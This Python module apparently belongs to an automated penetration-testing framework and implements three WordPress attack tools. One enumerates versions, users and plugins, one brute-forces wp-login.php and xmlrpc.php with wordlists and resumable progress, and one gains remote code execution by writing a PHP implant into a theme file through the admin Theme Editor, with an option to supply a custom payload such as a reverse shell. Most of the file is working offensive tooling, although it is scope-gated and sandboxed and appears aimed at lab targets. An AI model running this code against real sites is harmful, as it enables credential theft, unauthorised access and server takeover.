"""Durable WordPress attack handlers: enumeration, credential attack, RCE.

Three tools close the gap the "Internal" assessment exposed: OMNI could find
``/blog/`` with gobuster but had no way to *recognise* WordPress, to enumerate
its users, to attack its login or to turn an administrator credential into
command execution.

* :data:`nexus.web.wp_enum` — native enumeration (version, users, theme,
  plugins, XML-RPC, installation leftovers). No ``wpscan`` and no metadata
  database: the same facts come from plain HTTP in milliseconds, and the tool
  still works on a host where the scanner refuses to run.
* :data:`nexus.web.wp_bruteforce` — ``wp-login.php`` / ``xmlrpc.php`` credential
  attack, one authentication per HTTP request. XML-RPC ``system.multicall``
  batching was built first and then **withdrawn**: WordPress aborts the
  multicall at the first rejected credential, so batching reports 1499 false
  negatives out of 1500. The client now probes and records that property on
  every run. Offsets/resume and a progress file make a long run survivable.
* :data:`nexus.web.wp_exec` — authenticated command execution through the
  built-in Theme Editor (the classic admin-to-RCE path), with the original file
  restored by default so the engagement leaves no artifact behind.
"""

from __future__ import annotations

import base64
import json
import os
import re
from pathlib import Path
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment
from nexus_core.tools.parsers.wordpress import (
    WordPressFindings,
    extract_assets,
    extract_rest_users,
    extract_site_title,
    extract_version,
    normalize_site_url,
)

from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox, safe_run_id
from ._wp import (
    WP_BRUTEFORCE_CLIENT_SCRIPT,
    WP_EXEC_CLIENT_SCRIPT,
    WP_EXEC_MARKER,
    WP_EXEC_PARAMETER,
    XMLRPC_SOURCE,
)
from .ffuf import resolve_wordlist
from .workspace import resolve_workspace_path, workspace_root

WP_ALLOWED_PROGRAMS = RECON_ALLOWED_PROGRAMS

# --------------------------------------------------------------------------- #
# nexus.web.wp_enum
# --------------------------------------------------------------------------- #

WP_ENUM_DEFAULT_TIMEOUT_SECONDS = 60
WP_ENUM_MAX_TIMEOUT_SECONDS = 300
#: Bytes of each probed response handed back for parsing (front page, readme and
#: REST payloads are all far smaller; this is a defensive ceiling).
WP_ENUM_BODY_MAX_BYTES = 65_536
WP_ENUM_DEFAULT_MAX_USERS = 10
WP_ENUM_MAX_USERS = 50

#: Fixed probe set. Deliberately not operator-supplied: the tool's contract is
#: "describe this WordPress install", and a closed list keeps it from becoming a
#: general-purpose fetch primitive (``nexus.web.request`` already is one).
WP_ENUM_PROBES: tuple[tuple[str, str], ...] = (
    ("front_page", "/"),
    ("readme", "/readme.html"),
    ("rest_users", "/wp-json/wp/v2/users"),
    ("rest_users_query", "/?rest_route=/wp/v2/users"),
    ("xmlrpc", "/xmlrpc.php"),
    ("login", "/wp-login.php"),
    ("install", "/wp-admin/install.php"),
    ("uploads", "/wp-content/uploads/"),
    ("includes", "/wp-includes/"),
    ("license", "/license.txt"),
)

WP_ENUM_CLIENT_SCRIPT = r'''
import hashlib, json, re, sys

__XMLRPC__

PROBES = __PROBES__
BODY_MAX = __BODY_MAX__


def fetch(session, url, timeout):
    """Return (status, final_url, server, raw_bytes) for one GET."""
    try:
        response = session.opener.open(urllib.request.Request(url), timeout=timeout)
        headers = dict(response.headers)
        return response.status, response.geturl(), headers.get("Server"), _decompress(headers, response.read())
    except urllib.error.HTTPError as exc:
        headers = dict(exc.headers or {})
        final = exc.geturl() if hasattr(exc, "geturl") else url
        return exc.code, final, headers.get("Server"), _decompress(headers, exc.read())


def main():
    base, timeout_raw, max_users_raw = sys.argv[1:4]
    base = base.rstrip("/")
    timeout = float(timeout_raw)
    max_users = int(max_users_raw)
    session = WpSession(timeout=timeout)
    probes = []
    for name, path in PROBES:
        url = base + path
        entry = {"name": name, "path": path, "url": url, "status": None,
                 "final_url": None, "length": 0, "sha256": "", "body": "",
                 "error": None, "server": None}
        try:
            status, final_url, server, raw = fetch(session, url, timeout)
        except Exception as exc:
            entry["error"] = "%s: %s" % (type(exc).__name__, exc)
            probes.append(entry)
            continue
        entry.update({
            "status": status,
            "final_url": final_url,
            "server": server,
            "length": len(raw),
            "sha256": hashlib.sha256(raw).hexdigest(),
            "body": raw.decode("utf-8", "replace")[:BODY_MAX],
        })
        probes.append(entry)

    authors = []
    for index in range(1, max_users + 1):
        record = {"id": index, "status": None, "final_url": None, "slug": None, "error": None}
        try:
            status, final_url, _server, _raw = fetch(session, base + "/?author=" + str(index), timeout)
            record["status"] = status
            record["final_url"] = final_url
        except Exception as exc:
            record["error"] = "%s: %s" % (type(exc).__name__, exc)
        final = record.get("final_url") or ""
        found = re.search(r"/author/([A-Za-z0-9._-]+)", final)
        if found:
            record["slug"] = found.group(1)
        authors.append(record)

    print(json.dumps({"probes": probes, "authors": authors}))


main()
'''.replace("__XMLRPC__", XMLRPC_SOURCE)


def wp_enum_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.web.wp_enum``."""
    return ToolDefinition(
        tool_id="nexus.web.wp_enum",
        effect="read_only",
        name="WordPress reconnaissance",
        tenant_id=tenant_id,
        description=(
            "Enumera una instalación WordPress por HTTP: versión, usuarios "
            "(REST API y archivos de autor), tema, plugins, XML-RPC, login y "
            "restos de instalación. No necesita base de datos de wpscan. "
            "Solo lectura."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 4, "maxLength": 512},
                "max_users": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": WP_ENUM_MAX_USERS,
                    "description": "Cuántos IDs de autor probar (/?author=N).",
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": WP_ENUM_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["url"],
            "additionalProperties": False,
        },
        risk=RiskLevel.LOW,
        required_permissions=["execute:tool:nexus.web.wp_enum"],
        timeout_seconds=WP_ENUM_MAX_TIMEOUT_SECONDS + 30,
        max_output_bytes=4_000_000,
        scope_target_field="url",
        scope_required=True,
    )


def _analyze_wp_enum(base_url: str, payload: dict[str, Any]) -> tuple[WordPressFindings, list[dict]]:
    """Turn the client's raw probe dump into structured findings.

    Kept as a pure function so the parsing (and the "interesting" heuristics)
    can be unit-tested without a network.
    """
    probes = {entry.get("name"): entry for entry in payload.get("probes", [])}
    front = (probes.get("front_page") or {}).get("body") or ""
    readme = (probes.get("readme") or {}).get("body") or ""
    docs = [front]
    for entry in payload.get("probes", []):
        docs.append(entry.get("body") or "")

    version, version_source = extract_version(front, readme)
    assets = extract_assets(*docs)

    users: list[dict[str, Any]] = []
    interesting: list[dict[str, Any]] = []

    rest_entry = probes.get("rest_users") or {}
    rest_payload = rest_entry.get("body") or ""
    if rest_entry.get("status") == 404:
        rest_entry = probes.get("rest_users_query") or {}
        rest_payload = rest_entry.get("body") or ""
    if rest_entry.get("status") == 200:
        try:
            users = extract_rest_users(rest_payload)
        except ValueError:
            users = []
        if users:
            interesting.append(
                {
                    "id": "wp_rest_users_exposed",
                    "severity": "medium",
                    "detail": (
                        "La REST API publica las cuentas del sitio sin "
                        f"autenticación ({len(users)} usuarios)."
                    ),
                }
            )

    # Author archives are the fallback when the REST API is disabled: WordPress
    # redirects /?author=N to /author/<slug>/, which leaks the login name.
    known = {user.get("slug") for user in users}
    authors = payload.get("authors") or []
    for record in authors:
        slug = record.get("slug")
        if not slug or slug in known:
            continue
        known.add(slug)
        users.append({"id": record.get("id"), "slug": slug, "name": slug, "link": None})
    if any(record.get("slug") for record in authors) and not users:
        interesting.append(
            {
                "id": "wp_author_archive_enumeration",
                "severity": "low",
                "detail": "Los archivos de autor /?author=N permiten enumerar usuarios.",
            }
        )

    xmlrpc_entry = probes.get("xmlrpc") or {}
    if xmlrpc_entry.get("status") in (200, 405):
        body = xmlrpc_entry.get("body") or ""
        enabled = "XML-RPC server accepts POST requests only" in body or xmlrpc_entry.get("status") == 405
        if enabled:
            interesting.append(
                {
                    "id": "wp_xmlrpc_enabled",
                    "severity": "medium",
                    "detail": (
                        "xmlrpc.php acepta POST: permite system.multicall, es "
                        "decir probar cientos de contraseñas por petición."
                    ),
                }
            )

    # ``wp-admin/install.php`` answers 200 on *every* WordPress site, with
    # "Already Installed — You appear to have already installed WordPress". Only
    # the installer form itself is a finding, so the "already installed" reply is
    # explicitly excluded (a 200 alone would have been a false positive on the
    # Internal target).
    install_entry = probes.get("install") or {}
    install_body = install_entry.get("body") or ""
    install_lower = install_body.lower()
    if (
        install_entry.get("status") == 200
        and "already installed" not in install_lower
        and ("setup configuration file" in install_lower or 'id="setup"' in install_lower)
    ):
        interesting.append(
            {
                "id": "wp_install_php_reachable",
                "severity": "high",
                "detail": "wp-admin/install.php ofrece el instalador: el sitio no está instalado.",
            }
        )

    uploads_entry = probes.get("uploads") or {}
    uploads_body = uploads_entry.get("body") or ""
    if uploads_entry.get("status") == 200 and "Index of /" in uploads_body:
        interesting.append(
            {
                "id": "wp_uploads_directory_listing",
                "severity": "medium",
                "detail": "wp-content/uploads/ permite listar el directorio.",
            }
        )

    if version:
        interesting.append(
            {
                "id": "wp_version_disclosed",
                "severity": "low",
                "detail": f"WordPress {version} anunciado vía {version_source}.",
            }
        )

    findings = WordPressFindings(
        version=version,
        version_source=version_source,
        site_title=extract_site_title(front),
        users=tuple(users),
        themes=tuple(assets["themes"]),
        plugins=tuple(assets["plugins"]),
        interesting=tuple(interesting),
        raw_sha256=str((probes.get("front_page") or {}).get("sha256") or ""),
    )
    probe_summary = [
        {
            "name": entry.get("name"),
            "path": entry.get("path"),
            "status": entry.get("status"),
            "length": entry.get("length"),
            "sha256": entry.get("sha256"),
            "error": entry.get("error"),
        }
        for entry in payload.get("probes", [])
    ]
    return findings, probe_summary


async def wp_enum_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Enumerate a WordPress installation through the sandbox."""
    base_url = normalize_site_url(str(arguments.get("url") or ""))
    max_users = min(
        WP_ENUM_MAX_USERS, max(1, int(arguments.get("max_users") or WP_ENUM_DEFAULT_MAX_USERS))
    )
    requested = arguments.get("timeout_seconds")
    timeout_seconds = min(
        WP_ENUM_MAX_TIMEOUT_SECONDS,
        max(5, int(requested) if requested else WP_ENUM_DEFAULT_TIMEOUT_SECONDS),
    )

    script = (
        WP_ENUM_CLIENT_SCRIPT.replace("__PROBES__", repr(list(WP_ENUM_PROBES)))
        .replace("__BODY_MAX__", str(WP_ENUM_BODY_MAX_BYTES))
    )
    argv = ["python3", "-c", script, base_url, str(timeout_seconds), str(max_users)]
    root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox = sandbox_for_environment(root, allowed_programs=WP_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=timeout_seconds * 3 + 30,
        image_env="NEXUS_WP_IMAGE",
        default_image="kalilinux/kali-rolling",
    )

    evidence: dict[str, Any] = {
        "noise_level": "low",
        "url": base_url,
        "timeout_seconds": timeout_seconds,
        "max_users": max_users,
        "probes": len(WP_ENUM_PROBES),
    }
    payload = _last_json_object(result.stdout)
    if payload is None:
        return ToolResult(
            output={"error": "wp_enum produced no result", "url": base_url},
            verified=False,
            verification_method="wp_enum_no_output",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=result.timed_out,
        )

    findings, probe_summary = _analyze_wp_enum(base_url, payload)
    evidence.update(
        {
            "users": len(findings.users),
            "version": findings.version,
            "interesting": len(findings.interesting),
        }
    )
    return ToolResult(
        output={
            "url": base_url,
            "findings": findings.to_dict(),
            "probes": probe_summary,
        },
        verified=True,
        verification_method="wp_enum_completed",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
        timed_out=result.timed_out,
    )


# --------------------------------------------------------------------------- #
# nexus.web.wp_bruteforce
# --------------------------------------------------------------------------- #

WP_BRUTEFORCE_TRANSPORTS = ("xmlrpc", "wp-login")
WP_BRUTEFORCE_DEFAULT_TRANSPORT = "xmlrpc"
#: One authentication per HTTP request. Batching through XML-RPC
#: ``system.multicall`` was implemented, measured and **rejected**: WordPress
#: aborts the multicall at the first rejected credential, so every later call in
#: the same request inherits the fault. A 1500-call batch reported a comfortable
#: ~8000 pw/s while really testing one password per request — a 1499/1500 false
#: negative rate that a full rockyou sweep could not detect. See
#: ``._wp`` for the probe evidence and :func:`xmlrpc_short_circuit_probe`, which
#: the client now runs on every engagement.
#:
#: Measured cost of one authentication on the "Internal" target (2026-10-10):
#: ~220 ms round trip = 4.6 pw/s per connection, because phpass makes the
#: *server* the bottleneck (wpscan with ``--max-threads 30`` observed ~28 pw/s on
#: the same link). A 14.3 M-entry sweep is therefore ~142 h of target CPU, which
#: is why ``max_attempts`` defaults to the head of the dictionary: the classic
#: room credential sits at rockyou line 3882, and the whole point of the
#: dictionary order is that the head is where the likely passwords are.
WP_BRUTEFORCE_DEFAULT_WORKERS = 20
WP_BRUTEFORCE_MAX_WORKERS = 40
WP_BRUTEFORCE_DEFAULT_ATTEMPTS = 5_000
WP_BRUTEFORCE_MAX_ATTEMPTS = 15_000_000
#: ``wp-login.php`` is one request per password too, but the transport has no
#: completion signal other than a cookie, so the fan-out stays modest.
WP_BRUTEFORCE_MAX_WP_LOGIN_WORKERS = 10
WP_BRUTEFORCE_DEFAULT_TIMEOUT_SECONDS = 900
WP_BRUTEFORCE_MAX_TIMEOUT_SECONDS = 3600


def wp_bruteforce_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.web.wp_bruteforce``."""
    return ToolDefinition(
        tool_id="nexus.web.wp_bruteforce",
        effect="credential_access",
        name="WordPress credential attack",
        tenant_id=tenant_id,
        description=(
            "Ataca wp-login.php o xmlrpc.php con un usuario y una wordlist, una "
            "autenticación por petición (~28 pw/s con 30 hilos; phpass limita al "
            "servidor). Admite offset para reanudar y verifica la credencial "
            "por dos vías."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 4, "maxLength": 512},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password_file": {"type": "string", "minLength": 1, "maxLength": 1024},
                "transport": {
                    "type": "string",
                    "enum": list(WP_BRUTEFORCE_TRANSPORTS),
                    "default": WP_BRUTEFORCE_DEFAULT_TRANSPORT,
                },
        
                "workers": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": WP_BRUTEFORCE_MAX_WORKERS,
                    "description": "Conexiones concurrentes (1 autenticación por petición).",
                },
                "offset": {
                    "type": "integer",
                    "minimum": 0,
                    "maximum": WP_BRUTEFORCE_MAX_ATTEMPTS,
                    "description": "Saltar N entradas de la wordlist (reanudar).",
                },
                "max_attempts": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": WP_BRUTEFORCE_MAX_ATTEMPTS,
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 10,
                    "maximum": WP_BRUTEFORCE_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["url", "username", "password_file"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        required_permissions=["execute:tool:nexus.web.wp_bruteforce"],
        timeout_seconds=WP_BRUTEFORCE_MAX_TIMEOUT_SECONDS,
        max_output_bytes=2_000_000,
        scope_target_field="url",
        scope_required=True,
    )


def _slice_wordlist(source: str, dest: str, offset: int, limit: int) -> int:
    """Copy ``limit`` non-empty lines of ``source`` starting at ``offset``."""
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    count = 0
    with open(source, encoding="utf-8", errors="replace") as reader, open(
        dest, "w", encoding="utf-8"
    ) as writer:
        for index, line in enumerate(reader):
            if index < offset:
                continue
            token = line.rstrip("\r\n")
            if not token:
                continue
            writer.write(token + "\n")
            count += 1
            if count >= limit:
                break
    return count


def _read_progress(path: Path) -> dict[str, Any] | None:
    """Return the last progress checkpoint written by an in-flight run."""
    try:
        lines = path.read_text(encoding="utf-8", errors="replace").strip().splitlines()
    except OSError:
        return None
    for line in reversed(lines):
        try:
            return json.loads(line)
        except ValueError:
            continue
    return None


async def wp_bruteforce_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Attack a WordPress login with a wordlist."""
    base_url = normalize_site_url(str(arguments.get("url") or ""))
    username = str(arguments.get("username") or "").strip()
    if not username:
        raise ValueError("username is required")
    transport = str(arguments.get("transport") or WP_BRUTEFORCE_DEFAULT_TRANSPORT).strip().lower()
    if transport not in WP_BRUTEFORCE_TRANSPORTS:
        raise ValueError(f"unsupported transport: {transport!r}")

    workers = min(
        WP_BRUTEFORCE_MAX_WORKERS,
        max(1, int(arguments.get("workers") or WP_BRUTEFORCE_DEFAULT_WORKERS)),
    )
    if transport == "wp-login":
        workers = min(workers, WP_BRUTEFORCE_MAX_WP_LOGIN_WORKERS)
    offset = max(0, int(arguments.get("offset") or 0))
    max_attempts = min(
        WP_BRUTEFORCE_MAX_ATTEMPTS,
        max(1, int(arguments.get("max_attempts") or WP_BRUTEFORCE_DEFAULT_ATTEMPTS)),
    )
    requested = arguments.get("timeout_seconds")
    timeout_seconds = min(
        WP_BRUTEFORCE_MAX_TIMEOUT_SECONDS,
        max(10, int(requested) if requested else WP_BRUTEFORCE_DEFAULT_TIMEOUT_SECONDS),
    )

    root = workspace_root()
    source = resolve_wordlist(root, str(arguments.get("password_file") or ""))
    run_id = safe_run_id(context)
    run_dir = Path(root) / f"wpbrute_{run_id}"
    wordlist_path = run_dir / "wordlist.txt"
    progress_path = run_dir / "progress.ndjson"
    result_path = run_dir / "result.json"
    for stale in (progress_path, result_path):
        try:
            stale.unlink(missing_ok=True)
        except OSError:
            pass
    attempts = _slice_wordlist(source, str(wordlist_path), offset, max_attempts)
    if attempts == 0:
        raise ValueError("password_file has no usable entries at that offset")

    argv = [
        "python3",
        "-c",
        WP_BRUTEFORCE_CLIENT_SCRIPT,
        transport,
        base_url,
        username,
        str(wordlist_path),
        str(offset),
        str(attempts),
        str(workers),
        str(min(60.0, float(timeout_seconds))),
        str(progress_path),
        str(result_path),
    ]
    sandbox = sandbox_for_environment(root, allowed_programs=WP_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=float(timeout_seconds),
        image_env="NEXUS_WP_IMAGE",
        default_image="kalilinux/kali-rolling",
    )

    payload = _last_json_object(result.stdout)
    probe = (payload or {}).get("batching") or {}
    preflight = (payload or {}).get("preflight") or {}
    resumed_from = None
    if payload is None and result_path.exists():
        try:
            payload = json.loads(result_path.read_text(encoding="utf-8"))
            resumed_from = "result_file"
        except (OSError, ValueError):
            payload = None
    if payload is None:
        # Nothing usable came back (killed mid-run): salvage the last checkpoint
        # so the operator knows how far the wordlist got and where to resume.
        checkpoint = _read_progress(progress_path)
        evidence = {
            "noise_level": "high",
            "url": base_url,
            "username": username,
            "transport": transport,
            "workers": workers,
            "offset": offset,
            "attempts": attempts,
            "wordlist": source,
            "progress": checkpoint,
            "preflight": preflight,
        }
        return ToolResult(
            output={
                "url": base_url,
                "username": username,
                "transport": transport,
                "timed_out": result.timed_out,
                "checkpoint": checkpoint,
                "resume_offset": (offset + int((checkpoint or {}).get("tested") or 0)),
            },
            verified=False,
            verification_method="wp_bruteforce_incomplete",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=result.timed_out,
        )

    password = payload.get("password")
    verification = payload.get("verification") or {}
    verified = bool(password) and bool(verification.get("ok"))
    # A sweep that tested every candidate and validated none is a negative
    # result about the credential pair, not a failure of the body: the operator
    # has to be able to record "tried and rejected" without a RuntimeError
    # (V0-22). A sweep stopped early keeps failing closed.
    exhausted = payload.get("total") is not None and payload.get("tested") == payload.get("total")
    evidence = {
        "noise_level": "high",
        "url": base_url,
        "username": username,
        "transport": transport,
        "workers": workers,
        "offset": offset,
        "attempts": attempts,
        "tested": payload.get("tested"),
        "elapsed_seconds": payload.get("elapsed_seconds"),
        "rate_per_second": payload.get("rate_per_second"),
        "wordlist": source,
        "errors": payload.get("errors") or [],
        "preflight": preflight,
        # Documented property of the target's XML-RPC endpoint, measured with a
        # two-call probe once a credential is known: True means
        # ``system.multicall`` cannot be used as a credential transport (it
        # silently drops candidates after the first rejection).
        "batching_unsound": probe.get("batching_unsound"),
        "batching_control": probe.get("control"),
        "batching_observed": probe.get("observed"),
    }
    if resumed_from:
        evidence["payload_source"] = resumed_from
    # An exhausted sweep with no hit is recorded as the negative it is: the
    # attempt count stays readable and the credential count is explicit, so the
    # report can count "tried and rejected" instead of losing it in a
    # ``RuntimeError`` (V0-22).
    evidence["credentials_found"] = 1 if verified else 0
    if exhausted and not verified:
        evidence["reason"] = "sweep exhausted every candidate without validating a credential"
    return ToolResult(
        output={
            "url": base_url,
            "username": username,
            "transport": transport,
            "tested": payload.get("tested"),
            "total": payload.get("total"),
            "rate_per_second": payload.get("rate_per_second"),
            "elapsed_seconds": payload.get("elapsed_seconds"),
            "batching_unsound": probe.get("batching_unsound"),
            "valid_credentials": (
                [{"username": username, "password": password, "transport": transport}]
                if verified
                else []
            ),
            "verification": verification,
            "errors": payload.get("errors") or [],
        },
        verified=verified,
        verification_method="wp_credential_validated",
        outcome="negative" if exhausted and not verified else "",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
        timed_out=result.timed_out,
    )


# --------------------------------------------------------------------------- #
# nexus.web.wp_exec
# --------------------------------------------------------------------------- #

WP_EXEC_DEFAULT_THEME = "twentyseventeen"
WP_EXEC_DEFAULT_FILE = "404.php"
WP_EXEC_DEFAULT_COMMANDS = ("id",)
WP_EXEC_MAX_COMMANDS = 10
WP_EXEC_MAX_COMMAND_CHARS = 1024
WP_EXEC_DEFAULT_TIMEOUT_SECONDS = 120
WP_EXEC_MAX_TIMEOUT_SECONDS = 600
_FILE_RE = re.compile(r"^[A-Za-z0-9._-]+\.php$")
_THEME_RE = re.compile(r"^[A-Za-z0-9._-]+$")


def wp_exec_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.web.wp_exec``."""
    return ToolDefinition(
        tool_id="nexus.web.wp_exec",
        effect="exploit",
        name="WordPress admin RCE (theme editor)",
        tenant_id=tenant_id,
        description=(
            "Con credenciales wp-admin válidas, escribe un payload PHP en un "
            "fichero de tema desde el editor integrado, ejecuta comandos como "
            "el usuario web y **restaura** el fichero original al terminar. "
            "HIGH: ejecuta código en el objetivo."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 4, "maxLength": 512},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "minLength": 1, "maxLength": 256},
                "theme": {"type": "string", "minLength": 1, "maxLength": 64},
                "file": {"type": "string", "minLength": 4, "maxLength": 64},
                "commands": {
                    "type": "array",
                    "items": {"type": "string", "minLength": 1, "maxLength": WP_EXEC_MAX_COMMAND_CHARS},
                    "maxItems": WP_EXEC_MAX_COMMANDS,
                },
                "payload_file": {
                    "type": "string",
                    "maxLength": 1024,
                    "description": (
                        "Fichero del workspace cuyo contenido PHP se escribe tal "
                        "cual (p. ej. una reverse shell) en lugar del implante "
                        "por defecto."
                    ),
                },
                "restore": {
                    "type": "boolean",
                    "default": True,
                    "description": "Devolver el fichero del tema a su contenido original.",
                },
                "timeout_seconds": {"type": "integer", "minimum": 10, "maximum": 600},
            },
            "required": ["url", "username", "password"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        required_permissions=["execute:tool:nexus.web.wp_exec"],
        timeout_seconds=WP_EXEC_MAX_TIMEOUT_SECONDS,
        max_output_bytes=1_000_000,
        scope_target_field="url",
        scope_required=True,
    )


async def wp_exec_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Execute commands on a WordPress host through the admin Theme Editor."""
    base_url = normalize_site_url(str(arguments.get("url") or ""))
    username = str(arguments.get("username") or "").strip()
    password = str(arguments.get("password") or "")
    if not username or not password:
        raise ValueError("username and password are required")

    theme = str(arguments.get("theme") or WP_EXEC_DEFAULT_THEME).strip()
    if not _THEME_RE.fullmatch(theme):
        raise ValueError(f"invalid theme slug: {theme!r}")
    target_file = str(arguments.get("file") or WP_EXEC_DEFAULT_FILE).strip()
    if not _FILE_RE.fullmatch(target_file):
        raise ValueError(f"file must be a plain .php file name: {target_file!r}")

    commands = [str(item) for item in (arguments.get("commands") or list(WP_EXEC_DEFAULT_COMMANDS))]
    if len(commands) > WP_EXEC_MAX_COMMANDS:
        raise ValueError(f"too many commands: {len(commands)} > {WP_EXEC_MAX_COMMANDS}")
    for command in commands:
        if not command.strip() or len(command) > WP_EXEC_MAX_COMMAND_CHARS or "\x00" in command:
            raise ValueError("command is empty, too long or contains a NUL byte")

    restore = arguments.get("restore")
    restore = True if restore is None else bool(restore)

    content_b64 = ""
    payload_file = arguments.get("payload_file")
    if payload_file:
        path = resolve_workspace_path(str(payload_file))
        content_b64 = base64.b64encode(path.read_bytes()).decode("ascii")

    requested = arguments.get("timeout_seconds")
    timeout_seconds = min(
        WP_EXEC_MAX_TIMEOUT_SECONDS,
        max(10, int(requested) if requested else WP_EXEC_DEFAULT_TIMEOUT_SECONDS),
    )

    argv = [
        "python3",
        "-c",
        WP_EXEC_CLIENT_SCRIPT,
        base_url,
        username,
        password,
        theme,
        target_file,
        json.dumps(commands),
        content_b64,
        "1" if restore else "0",
        str(min(60.0, float(timeout_seconds))),
    ]
    root = workspace_root()
    sandbox = sandbox_for_environment(root, allowed_programs=WP_ALLOWED_PROGRAMS)
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=float(timeout_seconds),
        image_env="NEXUS_WP_IMAGE",
        default_image="kalilinux/kali-rolling",
    )

    payload = _last_json_object(result.stdout)
    evidence: dict[str, Any] = {
        "noise_level": "medium",
        "url": base_url,
        "theme": theme,
        "file": target_file,
        "commands": commands,
        "restore": restore,
        "marker": WP_EXEC_MARKER,
        "parameter": WP_EXEC_PARAMETER,
        "timeout_seconds": timeout_seconds,
    }
    if payload is None:
        return ToolResult(
            output={"error": "wp_exec produced no result", "url": base_url},
            verified=False,
            verification_method="wp_exec_no_output",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=result.timed_out,
        )

    outputs = payload.get("outputs") or []
    executed = [entry for entry in outputs if entry.get("stdout") not in (None, "")]
    # Post-condition: the implant actually ran every command (each response
    # carried the marker pair). Anything less is not "code execution".
    complete = (
        bool(payload.get("ok"))
        and bool(payload.get("authenticated"))
        and bool(payload.get("implanted"))
        and len(outputs) == len(commands)
        and len(executed) == len(commands)
    )
    evidence.update(
        {
            "authenticated": payload.get("authenticated"),
            "implanted": payload.get("implanted"),
            "restored": payload.get("restored"),
            "executed": len(executed),
            "client_error": payload.get("error"),
        }
    )
    return ToolResult(
        output={
            "url": base_url,
            "theme": theme,
            "file": target_file,
            "shell_url": payload.get("shell_url"),
            "authenticated": payload.get("authenticated"),
            "implanted": payload.get("implanted"),
            "restored": payload.get("restored"),
            "outputs": outputs,
            "error": payload.get("error"),
            "preview": payload.get("preview"),
        },
        verified=complete,
        verification_method="wp_command_executed",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
        timed_out=result.timed_out,
    )


def _last_json_object(text: str) -> dict[str, Any] | None:
    """Return the last JSON object printed on ``text`` (client stdout)."""
    for line in reversed((text or "").strip().splitlines()):
        candidate = line.strip()
        if not candidate.startswith("{"):
            continue
        try:
            payload = json.loads(candidate)
        except ValueError:
            continue
        if isinstance(payload, dict):
            return payload
    return None


__all__ = [
    "WP_ENUM_CLIENT_SCRIPT",
    "WP_ENUM_PROBES",
    "wp_bruteforce_definition",
    "wp_bruteforce_handler",
    "wp_enum_definition",
    "wp_enum_handler",
    "wp_exec_definition",
    "wp_exec_handler",
]
